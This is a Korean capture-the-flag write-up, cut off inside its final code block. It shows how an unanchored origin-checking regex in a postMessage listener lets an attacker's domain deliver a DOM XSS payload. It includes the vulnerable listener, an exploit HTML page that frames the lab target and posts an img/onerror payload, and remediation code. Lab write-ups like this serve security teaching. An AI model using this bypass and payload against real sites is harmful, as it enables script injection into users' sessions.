+++
title = "VulnABLE CTF [LUXORA] Write-up: PostMessage Abuse 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "PostMessage", "Silver", "Regex Bypass", "DOM XSS", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: PostMessage Abuse 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Client-Side Layer (PostMessage Abuse)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/postmsg/silver`
- **목표**: 타겟 페이지가 `event.origin` 검증 로직을 도입했으나, 그 검증에 사용된 **정규표현식(Regex)의 취약점**을 파고들어 도메인 검증을 우회하고 XSS 페이로드를 실행시켜라.

---

## 🕵️‍♂️ 1. 정보 수집 및 소스코드 분석 (Reconnaissance)

`/postmsg/silver` 페이지 소스코드를 열어 자바스크립트 이벤트 리스너 부분을 분석합니다.
Bronze와 달리, 보안 패치가 적용되어 Origin을 검증하는 로직이 추가되었습니다.

**[타겟 웹 페이지의 수신 코드]**
```html
<script>
  window.addEventListener("message", function(event) {
      // 보안 결함: 엉성한 정규표현식으로 Origin을 검사함
      const originRegex = /^https:\/\/.*\.luxora\.test/;
      
      if (!originRegex.test(event.origin)) {
          console.warn("Origin not allowed!");
          return;
      }
      
      // 검증 통과 시
      const data = event.data;
      if (data.type === 'updateText') {
          document.getElementById('message_box').innerHTML = data.content; // 취약한 Sink
      }
  });
</script>
```

**[해커의 사고 과정]**
1. 이 코드는 `event.origin`이 `https://` 로 시작하고 `luxora.test` 로 끝나는지 정규식으로 검사하고 있다.
2. 얼핏 보면 `https://subdomain.luxora.test` 만 통과시킬 것처럼 안전해 보인다.
3. 하지만 정규식에 치명적인 허점이 있다. `.*` (임의의 문자열) 부분이다!
4. 정규식이 문자열의 끝을 의미하는 `$` 앵커(Anchor)로 닫혀있지 않다. 즉, 문자열 중간에 저 패턴이 들어있기만 하면 무조건 통과된다!

---

## 💥 2. 취약점 식별 및 도메인 스푸핑 설계 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker Site ] --(postMessage(Malicious Data))--> [ Target iframe ]
                                                     |-- Missing Origin Check
                                                     |-- Executes DOM XSS
```


정규식 `^https:\/\/.*\.luxora\.test` 를 우회하는 해커의 악성 도메인을 설계해야 합니다.

### 💡 정규식 우회 도메인 만들기
해커는 정규식을 만족시키기 위해 자신의 도메인 이름에 `luxora.test`를 교묘하게 끼워 넣습니다.
- 우회 예시 1: `https://evil-attacker.luxora.test.com` (끝이 `.com` 이지만, 정규식에 `$`가 없으므로 통과!)
- 우회 예시 2: `https://www.luxora.test.evil.com`

해커는 `luxora.test.evil.com` 이라는 도메인을 구매하거나, 로컬 DNS를 조작하여 공격 서버를 이 도메인으로 띄웁니다.

---

## 🚀 3. 공격 수행 및 익스플로잇

### Step 1. 악성 HTML(Exploit) 호스팅
해커 서버(`https://www.luxora.test.evil.com`)에 이전 Bronze 단계와 똑같은 XSS 전송용 HTML 파일을 올립니다.

```html
<!DOCTYPE html>
<html>
<head><title>PostMessage Silver Exploit</title></head>
<body>
    <iframe id="targetFrame" src="http://localhost:3000/postmsg/silver" width="500" height="300"></iframe>

    <script>
        document.getElementById('targetFrame').onload = function() {
            const targetWin = this.contentWindow;
            const maliciousData = {
                type: 'updateText',
                content: '<img src="x" onerror="alert(\'POSTMSG_SILVER_XSS\')">'
            };
            targetWin.postMessage(maliciousData, '*');
        };
    </script>
</body>
</html>
```

### Step 2. 희생자 유도 및 결과 확인
관리자가 해커의 도메인(`https://www.luxora.test.evil.com/exploit.html`)에 접속합니다.

### 🔍 타겟 페이지의 방어 로직 평가
1. 타겟 페이지가 `postMessage`를 받습니다.
2. `event.origin` 의 값은 `https://www.luxora.test.evil.com` 입니다.
3. 정규식 `/^https:\/\/.*\.luxora\.test/` 가 실행됩니다. `https://www.luxora.test` 부분에서 매칭이 성공하고, `$`가 없으므로 뒤에 달린 `.evil.com` 은 무시됩니다.
4. 검증을 통과(True)하고 `innerHTML` 에 악성 스크립트가 꽂힙니다!

```text
[!] System: Regex bypass in PostMessage Origin detected.
FLAG: FLAG{POSTMSG_🥈_REGEX_BYPASS_D4E5F6}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

보안을 위해 정규표현식을 사용할 때, 끝맺음 기호(`$`) 하나를 빼먹은 사소한 실수가 어떻게 전체 도메인 검증 로직을 무너뜨리는지 명확히 보여주는 사례입니다.

**🔥 획득한 플래그:**
`FLAG{POSTMSG_🥈_REGEX_BYPASS_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
도메인(Origin) 검증 시 엉성한 정규표현식을 사용한 것이 화근입니다.

* **안전한 패치 가이드 (엄격한 정규식 및 화이트리스트)**
1. **정규식 수정**: 반드시 시작(`^`)과 끝(`$`)을 명확히 지정해야 합니다.
   ```javascript
   // ❌ 취약한 정규식
   /^https:\/\/.*\.luxora\.test/
   
   // ✅ 안전한 정규식 (점(\.)을 이스케이프하고 끝을 막음)
   /^https:\/\/[a-zA-Z0-9-]+\.luxora\.test$/
   ```
2. **배열(Array) 기반의 일치 검사 (권장)**: 
   정규표현식은 언제나 사람의 실수를 유발하므로, 복잡한 서브도메인이 없다면 배열의 `includes()` 함수나 `indexOf()`가 아닌 `===` 를 통한 완전 일치(Exact Match) 방식을 사용하는 것이 가장 강력하고 안전합니다.
   ```javascript
   const allowedOrigins = [
       "https://www.luxora.test",
       "https://api.luxora.test"
   ];
   if (!allowedOrigins.includes(event.origin)) {
       return; // 차단
   }